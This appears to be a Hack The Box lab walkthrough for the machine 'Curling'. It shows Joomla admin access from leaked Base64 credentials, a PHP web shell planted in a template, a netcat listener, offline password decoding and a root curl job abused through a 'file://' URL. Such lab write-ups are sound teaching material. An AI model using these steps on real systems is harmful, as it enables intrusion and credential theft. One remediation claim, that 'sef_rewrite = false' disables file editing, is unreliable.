---
title: "Curling – Joomla RCE & Privileged Automation Abuse"
date: 2026-01-01
categories:
  - Case Studies
  - Labs
tags: [HTB, Linux, Easy, Web, Joomla, RCE, Privilege Escalation, CeWL, Netcat, Python]
description: "Full-chain compromise of HTB Curling via exposed Base64 credentials, Joomla template RCE, credential backup decoding, and privileged curl automation abuse to achieve root."
image:
 
---

## Overview

> **Difficulty:** `Easy` &nbsp;|&nbsp; **OS:** `Linux` &nbsp;|&nbsp; **Release:** `2018-09-01`

Curling is a Linux machine centred around a Joomla CMS deployment with poor credential hygiene and an insecure privileged automation process. The attack chain requires careful enumeration of publicly accessible application content, chaining of a CMS template modification to achieve remote code execution, offline credential recovery, and abuse of a root-owned `curl` automation job to read restricted files. It closely mirrors real-world scenarios where developers embed credentials in web content and administrators run privileged scripts with user-controllable inputs.

In addition to this walkthrough, a formal engagement report was produced documenting findings, risk ratings, and remediation guidance.

📄 **[View the Engagement Report](/posts/Curling-Engagement-Report/)**

---

## Attack Chain Summary

```
[Recon] → [Base64 creds in page source] → [Joomla admin access]
       → [Template RCE] → [Credential backup recovery]
       → [SSH access] → [Privileged curl automation abuse] → [Root]
```

| Phase | Vector | Result |
|---|---|---|
| Initial Access | Base64 encoded credentials in page source → Joomla admin | Web server shell as `www-data` |
| Lateral Movement | Encoded credential backup decoded offline | SSH access as `floris` |
| Privilege Escalation | Root-owned curl job with user-controlled config | Arbitrary file read as root |

---

## Tools & Techniques

| Tool | Purpose |
|---|---|
| `nmap` | Service and version enumeration |
| `cewl` | Custom wordlist generation from web content |
| `joomscan` | Joomla CMS enumeration |
| `netcat` | Reverse shell handler |
| `python3` | Shell stabilisation and HTTP file transfer |

---

## 1. Reconnaissance & Enumeration

### Port Scan

```bash
nmap -sC -sV 10.129.71.236
```

![Nmap scan results](/assets/img/curling/1-nmap-scan.png)
*Figure 1: Service enumeration — SSH on 22, Apache/Joomla on 80*

Two services were identified. Port 80 revealed an Apache web server with `http-generator` returning **Joomla! – Open Source Content Management**, immediately flagging it for CMS-specific enumeration.

### Web Application Analysis

Manual review of the page source revealed a Base64-encoded string embedded in a comment:

```
Q3VybGluZzIwMTgh
```

Decoding inline:

```bash
echo "Q3VybGluZzIwMTgh" | base64 -d
# Output: Curling2018!
```

This suggested a developer had embedded credentials directly in publicly accessible application content — a common and dangerous misconfiguration. Combined with a username of `floris` identified via CeWL wordlist generation:

```bash
cewl http://10.129.71.236
```

Successful authentication to the Joomla admin panel was achieved at `/administrator`.

> **MITRE ATT&CK:** `T1552.001 — Credentials in Files`

---

## 2. Foothold

### Joomla Template RCE

With administrative access to the CMS, server-side code execution was possible through the **Templates** editor. The `error.php` file of the Beez3 template was modified to inject a minimal PHP command execution primitive:

```php
system($_GET['cmd']);
```

This provided web-accessible RCE via URL parameter, confirmed with:

```
http://10.129.71.236/templates/beez3/error.php?cmd=id
```

> **MITRE ATT&CK:** `T1505.003 — Server Software Component: Web Shell`

### Reverse Shell

A listener was established on the attacker machine:

```bash
nc -nlvp 9001
```

A bash reverse shell was triggered via the web shell, returning a shell as `www-data`. The shell was immediately stabilised:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

---

## 3. Lateral Movement — Credential Recovery

### Encoded Backup Discovery

Local filesystem enumeration revealed a file named `password_backup` in the home directory of user `floris`. The contents were not plaintext — analysis indicated multi-layer encoding.

The file was transferred to the attacker machine for offline analysis:

```bash
# Victim
python3 -m http.server 8000

# Attacker
wget http://10.129.71.236:8000/password_backup
```

Offline analysis (hex → bzip2 → gzip → bzip2 → ASCII) revealed the plaintext credential:

```
5d<wdCbdZu)|hChXll
```

SSH authentication as `floris` succeeded with this password, and the user flag was retrieved.

> **MITRE ATT&CK:** `T1552.001 — Credentials in Files`

---

## 4. Privilege Escalation

### Privileged Automation Abuse

Enumeration of the `admin-area` directory revealed two files owned by root: `report` and `input`. The `input` file contained a `url` parameter consumed by a root-owned process that periodically executed `curl` against it, writing output to `report`.

The key insight: the `input` file was writable by `floris`, meaning the URL passed to the root `curl` process was user-controlled.

By modifying `input` to reference a local restricted file via the `file://` URI scheme:

```bash
echo "url = \"file:///root/root.txt\"" > input
```

On the next execution of the automated job, the contents of `/root/root.txt` were written to `report`, confirming arbitrary file read as root and completing the engagement.

> **MITRE ATT&CK:** `T1053.003 — Scheduled Task/Job: Cron` | `T1574 — Hijack Execution Flow`

---

## 5. Key Takeaways

1. **Credentials in application content are critical findings** — even encoded values like Base64 are trivially reversible and should never appear in publicly accessible pages. This is consistently seen in real CMS deployments where developers hard-code test credentials during development.

2. **CMS template editors are a high-risk admin feature** — any authenticated admin on a Joomla, WordPress, or similar CMS can achieve RCE via the built-in file editor. Administrative interfaces must be network-restricted and monitored.

3. **Privileged automation with user-controlled inputs is a critical misconfiguration** — a root cron job that reads a user-writable config file is effectively a privilege escalation primitive. All privileged scripts should validate and sanitise their inputs, and config files should be root-owned and immutable.

---

## 6. Remediation

| Finding | Recommendation |
|---|---|
| Credentials in page source | Remove all embedded credentials from application content. Use environment variables or secrets management. |
| Joomla admin RCE via templates | Restrict admin panel to trusted IPs. Disable file editing in `configuration.php` (`$config->sef_rewrite = false`). |
| Weak credential storage | Replace custom encoding with proper secrets management. Never store credentials in backup files. |
| Privileged automation with user-controlled input | Make `input` file root-owned and immutable. Validate all URLs against an allowlist before passing to curl. |

*Full remediation detail in the [Engagement Report](/posts/Curling-Engagement-Report/).*

---

## References

- [HTB Machine — Curling](https://app.hackthebox.com/machines/160)
- [Joomla Template RCE — HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla)
- [MITRE T1505.003 — Web Shell](https://attack.mitre.org/techniques/T1505/003/)
- [MITRE T1053.003 — Cron](https://attack.mitre.org/techniques/T1053/003/)

---

*This write-up is based on a retired Hack The Box machine and is intended solely for educational and professional demonstration purposes.*
